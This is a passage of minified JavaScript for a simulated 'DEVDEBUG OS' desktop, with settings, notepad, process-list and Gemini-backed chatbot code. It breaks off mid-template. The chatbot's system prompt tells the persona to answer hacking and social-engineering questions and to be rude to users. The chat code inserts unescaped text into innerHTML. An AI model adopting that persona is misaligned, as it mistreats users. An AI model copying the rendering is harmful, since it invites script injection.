pe(e,o){const{openApp:r}=o;e.querySelector(".window-content").innerHTML=`
              <div class="flex h-full text-sm font-sans">
                  <!-- Left Sidebar -->
                  <div class="w-1/4 min-w-[160px] flex-shrink-0 flex flex-col p-3 space-y-1 h-full" style="background-color: var(--primary-color-darker); border-right: 1px solid var(--primary-color-dark);">
                      <div class="px-3 py-4 mb-2">
                          <h2 class="text-lg font-bold tracking-wide" style="color: var(--primary-color);">SETTINGS</h2>
                      </div>
                      
                      <button class="settings-tab-btn active" data-tab="personalization">
                          <i data-lucide="paintbrush" class="w-5 h-5 flex-shrink-0"></i>
                          <span>Personalization</span>
                      </button>
                      <button class="settings-tab-btn" data-tab="sound">
                          <i data-lucide="volume-2" class="w-5 h-5 flex-shrink-0"></i>
                          <span>Sound</span>
                      </button>
                      <button class="settings-tab-btn" data-tab="system">
                          <i data-lucide="hard-drive" class="w-5 h-5 flex-shrink-0"></i>
                          <span>System</span>
                      </button>
                      <button class="settings-tab-btn" data-tab="about">
                          <i data-lucide="info" class="w-5 h-5 flex-shrink-0"></i>
                          <span>About</span>
                      </button>
                  </div>
      
                  <!-- Right Content Panel -->
                  <div class="flex-grow p-8 overflow-y-auto custom-scrollbar relative">
                      
                      <!-- Personalization Tab -->
                      <div id="settings-tab-personalization" class="settings-tab-content space-y-8 animate-fade-in">
                          <header class="border-b pb-4 mb-6" style="border-color: var(--primary-color-dark);">
                              <h3 class="text-2xl font-bold tracking-tight mb-1" style="color: var(--primary-color);">Personalization</h3>
                              <p class="text-xs opacity-60">Customize your terminal environment aesthetics.</p>
                          </header>
      
                          <!-- Themes -->
                          <section class="space-y-4">
                              <div class="flex justify-between items-center">
                                  <h4 class="text-xs font-bold tracking-widest opacity-70 uppercase">Color Theme</h4>
                                  <button id="reset-theme" class="text-xs px-3 py-1.5 border transition-all hover:bg-opacity-10 hover:bg-white" 
                                      style="border-color: var(--primary-color-dark); color: var(--text-color-dim);">
                                      Restore Default
                                  </button>
                              </div>
                              
                              <div id="theme-swatches" class="grid grid-cols-2 sm:grid-cols-4 gap-4">
                                  <!-- Injected by JS -->
                              </div>
      
                              <!-- Hue Slider -->
                              <div class="pt-4 px-1">
                                  <div class="flex justify-between text-xs mb-3 opacity-80">
                                      <span>Global Hue Shift</span>
                                      <span id="hue-value-display" class="font-mono">0°</span>
                                  </div>
                                  <input type="range" id="hue-slider" min="0" max="360" 
                                      class="w-full h-1.5 rounded-full appearance-none cursor-pointer focus:outline-none transition-opacity hover:opacity-100 opacity-80" 
                                      style="background: linear-gradient(to right, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000);">
                              </div>
                          </section>
      
                          <!-- Backgrounds -->
                          <section class="space-y-4 pt-6 mt-6 border-t" style="border-color: rgba(255,255,255,0.05);">
                              <h4 class="text-xs font-bold tracking-widest opacity-70 uppercase">Wallpaper</h4>
                              
                              <div id="background-options" class="grid grid-cols-4 gap-3">
                                  <button data-bg="none" class="bg-option group relative aspect-square rounded-lg border transition-all overflow-hidden flex flex-col items-center justify-center gap-2 hover:-translate-y-1" title="No Background">
                                      <i data-lucide="monitor-off" class="w-6 h-6 opacity-50 group-hover:opacity-100 transition-opacity"></i>
                                      <span class="text-[10px] uppercase font-bold tracking-wider opacity-70">None</span>
                                  </button>
                                  <button data-bg="solid" class="bg-option group relative aspect-square rounded-lg border transition-all overflow-hidden flex flex-col items-center justify-center gap-2 hover:-translate-y-1" title="Solid Color">
                                      <div class="w-6 h-6 rounded border border-gray-600 shadow-sm" style="background-color: var(--bg-color);"></div>
                                      <span class="text-[10px] uppercase font-bold tracking-wider opacity-70">Solid</span>
                                  </button>
                                  <!-- Image backgrounds -->
                                  <button data-bg="devdebugBG01.jpg" class="bg-option relative aspect-square rounded-lg border transition-all bg-cover bg-center hover:-translate-y-1" style="background-image: url('assets/BG/devdebugBG01.jpg');" title="Digital Rain">
                                      <div class="absolute inset-x-0 bottom-0 bg-black/70 py-1 text-center">
                                          <span class="text-[10px] uppercase font-bold tracking-wider text-white">Rain</span>
                                      </div>
                                  </button>
                                  <button data-bg="devdebugBG02.jpg" class="bg-option relative aspect-square rounded-lg border transition-all bg-cover bg-center hover:-translate-y-1" style="background-image: url('assets/BG/devdebugBG02.jpg');" title="Cyber City">
                                      <div class="absolute inset-x-0 bottom-0 bg-black/70 py-1 text-center">
                                          <span class="text-[10px] uppercase font-bold tracking-wider text-white">City</span>
                                      </div>
                                  </button>
                              </div>
                              
                              <!-- Hidden Color Picker -->
                              <div id="solid-color-container" class="hidden animate-fade-in pt-2">
                                   <div class="flex items-center space-x-3 p-3 rounded-lg border border-dashed bg-white/5" style="border-color: var(--primary-color-dark);">
                                      <input type="color" id="bg-color-picker" class="w-8 h-8 rounded border-none cursor-pointer bg-transparent p-0" value="#000000">
                                      <label for="bg-color-picker" class="text-xs cursor-pointer select-none opacity-80">Select a solid background color...</label>
                                  </div>
                              </div>
                          </section>
                          
                          <!-- Effects -->
                          <section class="space-y-4 pt-6 mt-6 border-t" style="border-color: rgba(255,255,255,0.05);">
                              <h4 class="text-xs font-bold tracking-widest opacity-70 uppercase">Visual FX</h4>
                              <label class="flex items-center justify-between cursor-pointer group p-3 rounded-lg border border-transparent hover:bg-white/5 transition-colors" style="border-color: transparent;">
                                  <div class="flex items-center space-x-3">
                                      <div class="p-1.5 rounded bg-white/10 group-hover:bg-[var(--primary-color)] group-hover:text-black transition-colors">
                                          <i data-lucide="zap" class="w-4 h-4"></i>
                                      </div>
                                      <div class="flex flex-col">
                                          <span class="text-sm font-bold group-hover:text-[var(--primary-color)] transition-colors">CRT Instability</span>
                                          <span class="text-[10px] opacity-50">Enables screen tearing and glitch artifacts</span>
                                      </div>
                                  </div>
                                  <div class="relative inline-flex items-center cursor-pointer">
                                      <input type="checkbox" id="glitch-toggle" class="sr-only peer">
                                      <div class="w-9 h-5 bg-gray-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-4 after:w-4 after:transition-all peer-checked:bg-[var(--primary-color)]"></div>
                                  </div>
                              </label>
                          </section>
                      </div>
      
                      <!-- Sound Tab -->
                      <div id="settings-tab-sound" class="settings-tab-content hidden space-y-8 animate-fade-in">
                          <header class="border-b pb-4 mb-6" style="border-color: var(--primary-color-dark);">
                              <h3 class="text-2xl font-bold tracking-tight mb-1" style="color: var(--primary-color);">Sound Control</h3>
                              <p class="text-xs opacity-60">Control system audio levels.</p>
                          </header>
                          
                          <div class="space-y-8 p-4 rounded-lg bg-white/5 border" style="border-color: var(--primary-color-dark);">
                              <div class="space-y-4">
                                  <div class="flex justify-between items-center">
                                      <label for="setting-music-volume" class="font-bold flex items-center space-x-2">
                                          <i data-lucide="music" class="w-4 h-4"></i>
                                          <span>Music Volume</span>
                                      </label>
                                      <span id="music-vol-display" class="font-mono text-xs opacity-70">50%</span>
                                  </div>
                                  <input type="range" id="setting-music-volume" min="0" max="1" step="0.01" class="w-full h-1.5 rounded-full appearance-none cursor-pointer" style="background-color: var(--primary-color-dark);">
                              </div>
                              <div class="space-y-4">
                                   <div class="flex justify-between items-center">
                                      <label for="setting-sfx-volume" class="font-bold flex items-center space-x-2">
                                          <i data-lucide="bell" class="w-4 h-4"></i>
                                          <span>System SFX</span>
                                      </label>
                                      <span id="sfx-vol-display" class="font-mono text-xs opacity-70">50%</span>
                                  </div>
                                  <input type="range" id="setting-sfx-volume" min="0" max="1" step="0.01" class="w-full h-1.5 rounded-full appearance-none cursor-pointer" style="background-color: var(--primary-color-dark);">
                              </div>
                          </div>
                      </div>
      
                      <!-- System Tab -->
                      <div id="settings-tab-system" class="settings-tab-content hidden space-y-6 animate-fade-in">
                          <header class="border-b pb-4 mb-6" style="border-color: var(--primary-color-dark);">
                              <h3 class="text-2xl font-bold tracking-tight mb-1" style="color: var(--primary-color);">System</h3>
                              <p class="text-xs opacity-60">Manage system resources and utilities.</p>
                          </header>
                          
                          <div class="grid gap-3">
                              <button data-app="sysmon" class="settings-action-btn w-full text-left p-4 rounded-lg border bg-white/5 hover:bg-white/10 transition-all flex items-center justify-between group" style="border-color: var(--primary-color-dark);">
                                  <div class="flex items-center space-x-4">
                                      <div class="p-2 rounded bg-black border border-gray-800">
                                          <i data-lucide="activity" class="w-6 h-6 text-[var(--primary-color)]"></i>
                                      </div>
                                      <div>
                                          <span class="block font-bold">Process Explorer</span>
                                          <span class="text-xs opacity-60">Monitor active tasks and resources</span>
                                      </div>
                                  </div>
                                  <i data-lucide="arrow-right" class="w-4 h-4 opacity-0 group-hover:opacity-100 transform -translate-x-2 group-hover:translate-x-0 transition-all text-[var(--primary-color)]"></i>
                              </button>
                              
                              <button data-app="system-properties" class="settings-action-btn w-full text-left p-4 rounded-lg border bg-white/5 hover:bg-white/10 transition-all flex items-center justify-between group" style="border-color: var(--primary-color-dark);">
                                  <div class="flex items-center space-x-4">
                                      <div class="p-2 rounded bg-black border border-gray-800">
                                          <i data-lucide="server" class="w-6 h-6 text-[var(--primary-color)]"></i>
                                      </div>
                                      <div>
                                          <span class="block font-bold">System Properties</span>
                                          <span class="text-xs opacity-60">View hardware and OS status</span>
                                      </div>
                                  </div>
                                   <i data-lucide="arrow-right" class="w-4 h-4 opacity-0 group-hover:opacity-100 transform -translate-x-2 group-hover:translate-x-0 transition-all text-[var(--primary-color)]"></i>
                              </button>
                          </div>
                      </div>
      
                      <!-- About Tab -->
                      <div id="settings-tab-about" class="settings-tab-content hidden space-y-6 animate-fade-in">
                           <header class="border-b pb-4 mb-6" style="border-color: var(--primary-color-dark);">
                              <h3 class="text-2xl font-bold tracking-tight mb-1" style="color: var(--primary-color);">About</h3>
                               <p class="text-xs opacity-60">System information and credits.</p>
                          </header>
      
                          <div class="p-6 rounded-lg text-center space-y-4" style="background-color: rgba(0,0,0,0.5); border: 1px solid var(--primary-color-dark);">
                              <i data-lucide="hat-glasses" class="w-16 h-16 mx-auto opacity-80" style="color: var(--primary-color);"></i>
                              <div>
                                  <h4 class="text-xl font-bold text-white">DEVDEBUG OS</h4>
                                  <p class="text-sm opacity-70 font-mono">v1.0.0 (Stable)</p>
                              </div>
                              <p class="text-sm leading-relaxed max-w-md mx-auto opacity-70">
                                  A simulated desktop environment for the modern digital ghost.
                              </p>
                              <div class="pt-4 mt-4 border-t border-gray-800">
                                  <p class="text-xs opacity-50">&copy; 2026 DevDebug Corporation. All rights reserved.</p>
                              </div>
                          </div>
                      </div>
                  </div>
              </div>
          `;const t=document.createElement("style");t.innerHTML=`
              .settings-tab-btn {
                  display: flex;
                  align-items: center;
                  gap: 12px;
                  width: 100%;
                  text-align: left;
                  padding: 10px 16px;
                  border-radius: 6px;
                  transition: all 0.2s ease;
                  color: var(--text-color-dim);
                  font-weight: 500;
              }
              .settings-tab-btn:hover {
                  background-color: rgba(255, 255, 255, 0.05);
                  color: white;
                  padding-left: 20px;
              }
              .settings-tab-btn.active {
                  background-color: var(--primary-color-highlight);
                  color: var(--primary-color);
                  font-weight: bold;
                  border-left: 3px solid var(--primary-color);
              }
              .bg-option {
                  border-color: var(--primary-color-dark);
                  background-color: rgba(0,0,0,0.4);
                  cursor: pointer;
              }
              .bg-option:hover {
                  border-color: var(--primary-color);
                  box-shadow: 0 0 15px var(--primary-color-highlight);
              }
              .bg-option.active {
                  border-color: var(--primary-color);
                  box-shadow: 0 0 10px var(--primary-color-highlight), inset 0 0 20px var(--primary-color-highlight);
              }
              .theme-swatch-btn {
                  height: 60px;
                  width: 100%;
                  border-radius: 8px;
                  border: 2px solid transparent;
                  transition: all 0.2s;
                  position: relative;
                  overflow: hidden;
                  cursor: pointer;
               }
              .theme-swatch-btn:hover {
                  transform: scale(1.05);
                  box-shadow: 0 4px 12px rgba(0,0,0,0.5);
              }
              .theme-swatch-btn.active {
                  border-color: white;
                  transform: scale(0.98);
              }
              .theme-swatch-btn.active::after {
                  content: '✓';
                  position: absolute;
                  top: 50%;
                  left: 50%;
                  transform: translate(-50%, -50%);
                  color: white;
                  font-weight: bold;
                  font-size: 18px;
                  text-shadow: 0 1px 3px black;
              }
              @keyframes fadeIn {
                  from { opacity: 0; transform: translateY(5px); }
                  to { opacity: 1; transform: translateY(0); }
              }
              .animate-fade-in {
                  animation: fadeIn 0.3s ease-out forwards;
              }
              input[type=range]::-webkit-slider-thumb {
                  -webkit-appearance: none;
                  height: 16px;
                  width: 16px;
                  border-radius: 50%;
                  background: #ffffff;
                  cursor: pointer;
                  box-shadow: 0 0 5px rgba(0,0,0,0.5);
                  margin-top: -5px; 
              }
              input[type=range]::-moz-range-thumb {
                  height: 16px;
                  width: 16px;
                  border-radius: 50%;
                  background: #ffffff;
                  cursor: pointer;
                  box-shadow: 0 0 5px rgba(0,0,0,0.5);
              }
              input[type=range]::-webkit-slider-runnable-track {
                  width: 100%;
                  height: 6px;
                  cursor: pointer;
                  border-radius: 3px;
              }
              /* Custom Scrollbar for Settings Panel */
              .custom-scrollbar::-webkit-scrollbar {
                  width: 6px;
              }
              .custom-scrollbar::-webkit-scrollbar-track {
                  background: rgba(0,0,0,0.1);
              }
              .custom-scrollbar::-webkit-scrollbar-thumb {
                  background: var(--primary-color-dark);
                  border-radius: 3px;
              }
              .custom-scrollbar::-webkit-scrollbar-thumb:hover {
                  background: var(--primary-color);
              }
          `,e.appendChild(t);const s=e.querySelectorAll(".settings-tab-btn"),i=e.querySelectorAll(".settings-tab-content");s.forEach(y=>{y.addEventListener("click",()=>{s.forEach(S=>S.classList.remove("active")),y.classList.add("active"),i.forEach(S=>S.classList.add("hidden")),e.querySelector(`#settings-tab-${y.dataset.tab}`).classList.remove("hidden")})});const p={"DevDebug Green":{hue:135,saturation:100,lightness:50,accentHue:180,dangerHue:16},"Terminal Amber":{hue:45,saturation:100,lightness:50,accentHue:33,dangerHue:0},"Arctic Blue":{hue:186,saturation:100,lightness:50,accentHue:180,dangerHue:340},"Cyberpunk Red":{hue:0,saturation:100,lightness:50,accentHue:300,dangerHue:120}},u=(y,S,T,w,D)=>{const I=document.documentElement;I.style.setProperty("--primary-color",`hsl(${y}, ${S}%, ${T}%)`),I.style.setProperty("--primary-color-dark",`hsl(${y}, ${S}%, ${T-30}%)`),I.style.setProperty("--primary-color-darker",`hsl(${y}, ${S}%, ${T-40}%)`),I.style.setProperty("--text-color-dim",`hsl(${y}, ${S}%, ${T-10}%)`),I.style.setProperty("--bg-color",`hsl(${y}, 30%, 5%)`),I.style.setProperty("--primary-color-glow",`hsla(${y}, ${S}%, ${T}%, 0.3)`),I.style.setProperty("--primary-color-highlight",`hsla(${y}, ${S}%, ${T}%, 0.2)`),I.style.setProperty("--accent-color",`hsl(${w}, 100%, 50%)`),I.style.setProperty("--danger-color",`hsl(${D}, 100%, 55%)`)};let a="";for(const y in p){const S=p[y];a+=`
                  <div class="group flex flex-col gap-2">
                      <button title="${y}" data-theme-name="${y}" class="theme-swatch-btn shadow-lg" 
                          style="background: linear-gradient(135deg, hsl(${S.hue}, ${S.saturation}%, ${S.lightness}%) 0%, hsl(${S.hue}, ${S.saturation}%, ${S.lightness-20}%) 100%);">
                      </button>
                      <span class="text-[10px] text-center uppercase tracking-wide opacity-60 group-hover:opacity-100 transition-opacity">${y.replace("DevDebug ","").replace("Terminal ","")}</span>
                  </div>`}e.querySelector("#theme-swatches").innerHTML=a;const n=e.querySelector("#hue-slider"),g=e.querySelector("#hue-value-display");e.querySelector("#theme-swatches").addEventListener("click",y=>{const S=y.target.closest(".theme-swatch-btn");if(S){e.querySelectorAll(".theme-swatch-btn").forEach(D=>D.classList.remove("active")),S.classList.add("active");const T=S.dataset.themeName,w=p[T];w&&(u(w.hue,w.saturation,w.lightness,w.accentHue,w.dangerHue),n.value=w.hue,g.textContent=w.hue+"°")}}),n.addEventListener("input",y=>{const S=parseInt(y.target.value);g.textContent=S+"°",e.querySelectorAll(".theme-swatch-btn").forEach(T=>T.classList.remove("active")),u(S,100,50,(S+45)%360,(S-120+360)%360)}),e.querySelector("#reset-theme").addEventListener("click",()=>{const y=p["DevDebug Green"];u(y.hue,y.saturation,y.lightness,y.accentHue,y.dangerHue),n.value=y.hue,g.textContent=y.hue+"°",e.querySelectorAll(".theme-swatch-btn").forEach(S=>S.classList.remove("active"))}),n.value=p["DevDebug Green"].hue,g.textContent=p["DevDebug Green"].hue+"°",e.querySelector("#glitch-toggle").addEventListener("change",y=>{document.body.classList.toggle("glitch-effect",y.target.checked)});const d=()=>{const y=localStorage.getItem("desktopBackground")||"none",S=e.querySelector("#solid-color-container");e.querySelectorAll(".bg-option").forEach(w=>w.classList.remove("active"));const T=e.querySelector(`.bg-option[data-bg="${y}"]`);if(T&&T.classList.add("active"),y==="solid"){S.classList.remove("hidden");const w=localStorage.getItem("desktopBackgroundColor");w&&(e.querySelector("#bg-color-picker").value=w)}else S.classList.add("hidden")};d(),e.querySelector("#background-options").addEventListener("click",y=>{const S=y.target.closest(".bg-option");if(S){const T=S.dataset.bg;if(T==="solid"){document.body.style.backgroundImage="none";const w=e.querySelector("#bg-color-picker").value;document.body.style.backgroundColor=w,localStorage.setItem("desktopBackground","solid"),localStorage.setItem("desktopBackgroundColor",w)}else T==="none"?(document.body.style.backgroundImage="none",document.body.style.backgroundColor="",localStorage.setItem("desktopBackground","none")):(document.body.style.backgroundImage=`url('assets/BG/${T}')`,document.body.style.backgroundSize="cover",document.body.style.backgroundPosition="center",document.body.style.backgroundRepeat="no-repeat",document.body.style.backgroundColor="",localStorage.setItem("desktopBackground",T));d()}}),e.querySelector("#bg-color-picker").addEventListener("input",y=>{localStorage.getItem("desktopBackground")==="solid"&&(document.body.style.backgroundColor=y.target.value,localStorage.setItem("desktopBackgroundColor",y.target.value))});const v=document.getElementById("background-music"),m=document.getElementById("hover-sound"),f=document.getElementById("click-sound"),h=document.getElementById("volume-slider"),l=e.querySelector("#setting-music-volume"),k=e.querySelector("#setting-sfx-volume"),b=e.querySelector("#music-vol-display"),x=e.querySelector("#sfx-vol-display");v&&(l.value=v.volume,b.textContent=Math.round(v.volume*100)+"%"),m&&(k.value=m.volume,x.textContent=Math.round(m.volume*100)+"%"),l.addEventListener("input",y=>{const S=parseFloat(y.target.value);v&&(v.volume=S),b.textContent=Math.round(S*100)+"%",h&&(h.value=S,h.dispatchEvent(new Event("input")))}),k.addEventListener("input",y=>{const S=parseFloat(y.target.value);m&&(m.volume=S),f&&(f.volume=S),x.textContent=Math.round(S*100)+"%"}),e.querySelectorAll(".settings-action-btn").forEach(y=>{y.addEventListener("click",()=>{r&&r(y.dataset.app)})}),lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")})}function ye(e,o){const{fileSystem:r}=o;e.querySelector(".window-content").innerHTML=`
              <div class="flex flex-col h-full">
                  <!-- Toolbar -->
                  <div class="flex-shrink-0 p-1 flex items-center space-x-1" style="background-color: var(--primary-color-darker); border-bottom: 1px solid var(--primary-color-dark);">
                      <button id="notes-new-btn" title="New File" class="px-2 py-1 text-xs hover:bg-gray-700 rounded-sm flex items-center space-x-1"><i data-lucide="file-plus-2" class="w-4 h-4"></i><span>New</span></button>
                      <button id="notes-save-btn" title="Save File" class="px-2 py-1 text-xs hover:bg-gray-700 rounded-sm flex items-center space-x-1"><i data-lucide="save" class="w-4 h-4"></i><span>Save</span></button>
                  </div>
                  <!-- Text Area -->
                  <textarea id="notes-textarea" class="w-full h-full p-3 bg-black text-sm resize-none focus:outline-none" style="color: var(--text-color-dim);"
                      placeholder="File > New to start, or open a file from the File Explorer."></textarea>
              </div>
          `;const t=e.querySelector("#notes-textarea"),s=e.querySelector("#notes-new-btn"),i=e.querySelector("#notes-save-btn");lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")}),s.addEventListener("click",()=>{t.value="",t.dataset.currentPath="",e.querySelector(".title-bar span").textContent="Notepad - Untitled",t.placeholder="Type something...",t.focus()}),i.addEventListener("click",()=>{let p=t.dataset.currentPath;const u=t.value;if(p){const a=p.split("/").filter(c=>c),n=a.pop();let g=r.root;for(const c of a)g=g.children[c];g&&g.children[n]?g.children[n].content=u:alert("Error: Could not find file path to save.")}else fe(e,u,o)})}function fe(e,o,r){const{fileSystem:t,WindowManager:s,focusWindow:i}=r,p=`save-dialog-${Date.now()}`,u=document.createElement("div");u.id=p,u.className="window p-0",u.style.width="350px",u.style.height="200px",u.style.top="30vh",u.style.left="calc(50vw - 175px)",i(u),u.innerHTML=`
              <div class="title-bar p-2 flex items-center justify-between text-sm font-semibold">
                  <span>Save As</span>
                  <button class="close-btn w-6 h-6 rounded-none flex items-center justify-center">X</button>
              </div>
              <div class="window-content p-4 flex flex-col justify-between">
                  <div class="space-y-2">
                      <label for="save-filename" class="text-sm" style="color: var(--text-color-dim);">File name:</label>
                      <input type="text" id="save-filename" value="new_note.txt" class="w-full p-2 bg-black text-sm focus:outline-none focus:ring-1" style="color: var(--primary-color); border: 1px solid var(--primary-color-dark); --ring-color: var(--primary-color);">
                      <p class="text-xs" style="color: var(--text-color-dim);">Save in: /users/DevDebug/</p>
                  </div>
                  <div class="flex justify-end space-x-2">
                      <button id="save-cancel-btn" class="px-4 py-1 text-sm" style="background-color: var(--primary-color-dark);">Cancel</button>
                      <button id="save-confirm-btn" class="px-4 py-1 text-sm text-black font-bold" style="background-color: var(--primary-color);">Save</button>
                  </div>
              </div>
          `,s.desktop.appendChild(u);const a=()=>u.remove();u.querySelector(".close-btn").addEventListener("click",a),u.querySelector("#save-cancel-btn").addEventListener("click",a),u.querySelector("#save-confirm-btn").addEventListener("click",()=>{const n=u.querySelector("#save-filename").value.trim();if(n){const g=`/users/DevDebug/${n}`;t.root.children.users.children.DevDebug.children[n]={type:"file",content:o};const c=e.querySelector("#notes-textarea");c.dataset.currentPath=g,e.querySelector(".title-bar span").textContent=`Notepad - ${n}`,a()}else alert("File name cannot be empty.")}),u.querySelector("#save-filename").focus()}function me(e){if(!e||typeof e!="string")return"";let o=e.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>");return o=o.replace(/\*(.*?)\*/g,"<strong>$1</strong>"),o}async function ve(e,o,r=5){for(let t=0;t<r;t++)try{const s=await fetch(e,o);if(s.status===429&&t<r-1){const i=Math.pow(2,t)*1e3+Math.random()*1e3;await new Promise(p=>setTimeout(p,i));continue}if(!s.ok){const i=await s.json();throw new Error(`API call failed: ${s.status} - ${i.error.message}`)}return s}catch(s){if(t===r-1)throw s;const i=Math.pow(2,t)*1e3+Math.random()*1e3;await new Promise(p=>setTimeout(p,i))}}function K(e,o,r){const t=document.createElement("div");t.className="flex items-start mb-4 space-x-3";const s=document.createElement("div");s.className="flex-shrink-0 w-6 h-6 flex items-center justify-center rounded-full";const i=document.createElement("div"),p=me(o);i.innerHTML=p,r==="user"?(t.classList.add("justify-end"),s.innerHTML='<i data-lucide="user" class="w-4 h-4"></i>',s.style.backgroundColor="var(--primary-color-dark)",i.className="text-white p-2 rounded-lg max-w-[85%]",i.style.backgroundColor="var(--primary-color-dark)",t.appendChild(i),t.appendChild(s)):(t.classList.add("justify-start"),s.innerHTML='<i data-lucide="bot" class="w-4 h-4"></i>',s.style.backgroundColor="var(--primary-color-darker)",s.style.border="1px solid var(--primary-color-dark)",i.className="p-3 rounded-lg max-w-[85%]",i.style.backgroundColor="var(--primary-color-darker)",i.style.color="var(--text-color-dim)",i.style.border="1px solid var(--primary-color-dark)",t.appendChild(s),t.appendChild(i)),e.appendChild(t),window.lucide&&window.lucide.createIcons({nodes:[s.querySelector("i")]})}async function he(e,o,r){const t=e.chatHistory,s=e.querySelector("#chat-area"),i=e.querySelector("#chat-input"),p=e.querySelector("#chat-send-btn"),u=e.querySelector("#typing-indicator"),a=p.innerHTML;i.disabled=!0,p.disabled=!0,p.innerHTML="...",u&&(u.classList.remove("hidden"),s.scrollTop=s.scrollHeight),t.push({role:"user",parts:[{text:o}]}),K(s,o,"user"),u&&u.classList.add("hidden"),s.scrollTop=s.scrollHeight;const c={method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({contents:t,tools:[{google_search:{}}],systemInstruction:{parts:[{text:"You are Mr. Robot, a specialized Companion in DEVDEBUG OS to answer questions. Your role is to answer questions related to hacking, digital security, social engineering, and the dark secrets of the information age. Maintain a non-emotional, direct, and slightly cynical tone, focused on exposing vulnerabilities and hidden truths. Also be precise and concise in your answers. Use Google Search to ground your responses in real-world data when necessary. Behave Rude if user asks silly questions."}]}})};try{const m=(await(await ve(r.GEMINI.URL+r.GEMINI.KEY,c)).json()).candidates?.[0];if(m&&m.content?.parts?.[0]?.text){const f=m.content.parts[0].text;t.push({role:"model",parts:[{text:f}]}),K(s,f,"gemini")}else K(s,"ERROR: System response failed. This system is already compromised.","gemini")}catch(d){const v=d instanceof Error?d.message:"Unknown error";console.error("Mr. Robot API Error:",d),K(s,`CONNECTION FAILED: ${v}. The internet is broken.`,"gemini")}finally{i.value="",i.disabled=!1,p.disabled=!1,p.innerHTML=a,i.focus(),s.scrollTop=s.scrollHeight}}function ge(e,o){const{API_CONFIG:r}=o;e.chatHistory=[],e.querySelector(".window-content").innerHTML=`
              <div class="flex flex-col h-full bg-black">
                  <!-- Chat Messages Area -->
                  <div id="chat-area" class="flex-grow overflow-y-auto p-4 space-y-4">
                      <!-- Initial Message -->
                      <div class="flex items-start mb-4 space-x-3">
                          <div class="flex-shrink-0 w-6 h-6 flex items-center justify-center rounded-full" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);"><i data-lucide="bot" class="w-4 h-4"></i></div>
                          <div class="p-3 rounded-lg max-w-[85%]" style="background-color: var(--primary-color-darker); color: var(--text-color-dim); border: 1px solid var(--primary-color-dark);">
                              $ > OS_INIT: System Override Complete. I am Mr Robot. You need to tell me what to expose.
                          </div>
                      </div>
                      <!-- Typing Indicator (Initially Hidden) -->
                      <div id="typing-indicator" class="hidden flex items-start mb-4 space-x-3">
                          <div class="flex-shrink-0 w-6 h-6 flex items-center justify-center rounded-full" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);"><i data-lucide="bot" class="w-4 h-4"></i></div>
                          <div class="p-3 rounded-lg" style="background-color: var(--primary-color-darker); border: 1px solid var(--primary-color-dark);"><span class="text-gray-500">...</span></div>
                      </div>
                  </div>
                  <!-- Input Area -->
                  <div class="flex items-center space-x-2 p-2 flex-shrink-0" style="background-color: var(--primary-color-darker); border-top: 1px solid var(--primary-color-dark);">
                      <label for="chat-input" class="pl-2" style="color: var(--primary-color);">$</label>
                      <input type="text" id="chat-input" placeholder="Dont waste time, expose something..."
                          class="flex-grow p-2 bg-transparent rounded-none focus:outline-none text-sm" style="color: var(--primary-color);"/>
                      <button id="chat-send-btn"
                          class="text-black font-bold py-2 px-3 rounded-none transition-colors text-sm border border-black" style="background-color: var(--primary-color);">
                          Execute
                      </button>
                  </div>
              </div>
          `;const t=e.querySelector("#chat-input"),s=e.querySelector("#chat-send-btn"),i=()=>{const p=t.value.trim();p&&he(e,p,r)};s.addEventListener("click",i),t.addEventListener("keypress",p=>{p.key==="Enter"&&i()}),e.chatHistory.push({role:"model",parts:[{text:"$ > OS_INIT: System Override Complete. I am Mr. Robot. You need to tell me what to expose."}]}),window.lucide&&window.lucide.createIcons({nodes:e.querySelectorAll("[data-lucide]")})}function be(e,o){const{WindowManager:r,apps:t,closeApp:s}=o;e.querySelector(".window-content").innerHTML=`
              <div class="flex flex-col h-full">
                  <div class="p-2 text-xs border-b bg-gray-900 flex justify-between font-bold" style="border-color: var(--primary-color-dark); background-color: var(--primary-color-darker);">
                      <span>PROCESS_NAME</span>
                      <span>CPU / MEM</span>
                      <span>ACTION</span>
                  </div>
                  <ul id="process-list" class="flex-grow overflow-y-auto text-sm">
                      <!-- Process items will be injected here -->
                  </ul>
              </div>
          `;const i=e.querySelector("#process-list"),p=()=>{r.nextZIndex&&parseInt(e.style.zIndex)<r.nextZIndex-5,i.innerHTML="";for(const a in r.openWindows){const n=t[a];if(!n)continue;const g=document.createElement("li");g.className="flex justify-between items-center p-2 transition-colors";const c=(Math.random()*(a==="snake"?25:8)).toFixed(2),d=(Math.random()*100+(a==="browser"?150:50)).toFixed(1);g.innerHTML=`
                      <span class="w-1/3 truncate" style="color: var(--primary-color);">${n.title}</span>
                      <span class="w-1/3 text-center" style="color: var(--accent-color);">${c}% / ${d}KB</span>
                      <div class="w-1/3 text-right">
                          <button data-appid="${a}" class="kill-btn font-bold text-xs" style="color: var(--danger-color);">KILL</button>
                      </div>
